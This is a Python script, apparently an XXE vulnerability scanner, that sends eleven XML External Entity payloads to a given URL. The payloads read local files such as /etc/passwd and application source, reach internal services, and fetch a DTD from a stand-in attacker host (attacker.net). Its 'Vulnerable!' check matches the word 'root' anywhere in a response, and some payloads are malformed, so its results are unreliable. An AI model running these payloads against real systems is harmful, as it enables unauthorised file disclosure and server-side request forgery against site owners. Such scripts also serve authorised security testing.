import argparse
import requests
from termcolor import colored

parser = argparse.ArgumentParser(description='Check XXE injection vulnerability on a website.')
parser.add_argument('url', metavar='URL', type=str, help='URL to check for XXE injection vulnerability')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
args = parser.parse_args()

url = args.url
payloads = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]><foo/>',
    '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><contacts><contact><name>Jean &xxe; Dupont</name><phone>00 11 22 33 44</phone><address>42 rue du CTF</address><zipcode>75000</zipcode><city>Paris</city></contact></contacts>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "data:,file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "ftp://attacker.net/%2e%2e/%2e%2e/%2e%2e/etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://attacker.net/xxe.dtd">%xxe;]<foo>&all;</foo>',
]
# Parte 3: Escaneo y resultado
for payload in payloads:
    print(colored("Payload:", "green"), colored(payload, "green"))
    response = requests.post(url, data=payload)
    if "root" in response.text or "/etc/passwd" in response.text or "Dupont" in response.text:
        print(colored("Vulnerable!\n", "red"))
    else:
        print(colored("Not vulnerable.\n", "yellow"))
